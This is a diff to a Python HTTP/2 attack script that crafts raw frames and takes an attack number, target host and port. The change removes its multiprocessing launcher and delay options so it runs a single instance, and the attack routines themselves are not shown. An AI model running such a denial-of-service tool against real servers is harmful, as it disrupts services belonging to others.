@@ -4,8 +4,7 @@ import socket, ssl, logging, time, sys, argparse
 import h2.connection
 from h2.config import H2Configuration
 from hyperframe.frame import SettingsFrame, WindowUpdateFrame, HeadersFrame
-from hpack import Encoder
-from multiprocessing import Process
+from hpack.hpack_compat import Encoder
 
 PREAMBLE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
 WINDOW_INCREMENT_SIZE = 1073676289 # value used by curl measured during tests
@@ -109,9 +108,6 @@ parser = argparse.ArgumentParser()
 parser.add_argument("attackn", help="specify the attack number", type=int, choices=range(1, 6))
 parser.add_argument("target", help="specify the hostname or IP of the target", type=str)
 parser.add_argument("port", help="target port", type=int)
-parser.add_argument('-P', '--process', type=int, default=2, help='Number of processes to spawn')
-parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1 seconds)')
-
 args = parser.parse_args()
 
 
@@ -141,21 +137,5 @@ def main():
 
     input('Press a key to continue...')
 
-# Initialize the process list
-lst_proc = []
-
-# Spawn the specified number of processes
-for i in range(args.process):
-    # Creating a new process for the attack
-    process = Process(target=main, daemon=True)
-    lst_proc.append(process)
-    process.start()
-                     
-    # Delay between starting each process to control the load
-    time.sleep(args.delay)
-
-# Join the processes to wait for them to complete
-for proc in lst_proc:
-    if proc.is_alive():
-        proc.join()
+main()
 
